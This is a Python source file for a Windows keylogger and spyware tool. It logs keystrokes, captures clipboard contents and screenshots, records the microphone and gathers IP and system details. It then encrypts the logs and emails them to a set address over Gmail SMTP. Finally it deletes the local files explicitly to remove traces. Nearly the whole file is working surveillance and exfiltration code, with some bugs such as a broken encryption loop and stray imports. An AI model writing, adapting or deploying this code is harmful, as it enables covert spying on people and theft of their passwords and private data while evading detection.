# ===============================
#          IMPORT LIBRARIES
# ===============================
# Email Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Libraries for collecting computer info
import socket
import platform
from os import replace

# Clipboard
import win32clipboard
from Tools.scripts.pindent import delete_file

# Grab Keystrokes
from pynput.keyboard import Key, Listener

# System Info to track Time
import time
import os

from scipy.constants import fermi
# Microphone
from scipy.io.wavfile import write
import sounddevice as sd

# Encrypt files
from cryptography.fernet import Fernet

# Get username and some more computer info
import getpass
from requests import get

# Screenshot (only take one ss at a time)
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# ===============================
#       GLOBAL VARIABLES
# ===============================
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
time_iterations_end = 3

email_address = <DISPOSABLE_EMAIL>
password = <APP_PASSWORD>

toaddr = <DISPOSABLE_EMAIL>

key = "xvWr0Lc5YQoO4YKPa_SBhRWxNUWrSAWoDsFdSoXIAww="

file_path = "C:\\Users\\pranj\\Desktop\\KeyLogger"
extend = "\\"
file_merge = file_path + extend

# ===============================
#         FUNCTION DEFINITIONS
# ===============================

def send_email(filename, attachment, toaddr):
    """
    Sends an email with an attachment.
    Parameters:
        filename (str): The name of the file to attach.
        attachment (str): The file path of the attachment.
        toaddr (str): Recipient email address.
    """
    fromaddr = email_address
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "KeyLogger Log File"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def computer_information():
    """
    Collects and writes system information to a log file.
    """
    with open(file_path + extend + system_information, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        # Get IP Address
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Could not get public IP address. MAX query")

        # Get Processor Info
        f.write("Processor: " + (platform.processor()) + "\n")
        # Get System info
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        # Get Machine info
        f.write("Machine: " + platform.machine() + "\n")
        # Get Hostname
        f.write("Hostname: " + hostname + "\n")
        # Private IP Address
        f.write("Private IP Address: " + IPAddr + "\n")

def copy_clipboard():
    """
    Retrieves and logs clipboard data.
    """
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except:
            f.write("Could not get clipboard data.")

def microphone():
    """
    Records audio from the microphone for a fixed duration.
    """
    fs = 44100         # sampling frequency
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

def screenshot():
    """
    Takes a screenshot and saves it.
    """
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def keylogging_loop():
    """
    Handles the keylogging process and iterates for a specified number of iterations.
    After each iteration, it resets the log, captures additional data, and sends emails.
    """
    number_of_iterations = 0
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

    while number_of_iterations < time_iterations_end:
        # Logging Keys
        count = 0
        keys = []

        def on_press(key):
            nonlocal keys, count, currentTime
            print(key)
            keys.append(key)
            count += 1
            currentTime = time.time()
            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()

        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            with open(file_path + extend + keys_information, "w") as f:
                f.write(" ")
            screenshot()
            send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
            copy_clipboard()
            number_of_iterations += 1
            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

def encrypt_and_email_files():
    """
    Encrypts selected files and sends them via email.
    """
    files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
    encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

    for count, encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        with open(encrypted_files_names[count], 'wb') as f:
            f.write(encrypted_data)

        send_email(encrypted_files_names[count], encrypted_files_names[count], toaddr)

def cleanup_files():
    """
    Deletes log files and other tracks to clean up the system.
    """
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_merge + file)

# ===============================
#            MAIN EXECUTION
# ===============================
if __name__ == '__main__':
    # Send initial keylogger log via email
    send_email(keys_information, file_path + extend + keys_information, toaddr)

    # Collect system information and log it
    computer_information()

    # Capture clipboard data and log it
    copy_clipboard()

    # Take an initial screenshot
    screenshot()

    # Records audio from the microphone
    microphone()

    # Start the keylogging loop (this will run for the specified iterations)
    keylogging_loop()

    # Encrypt log files and email the encrypted versions
    encrypt_and_email_files()

    # Wait for 2 minutes before cleanup (if needed)
    time.sleep(120)

    # Clean up files to remove traces
    cleanup_files()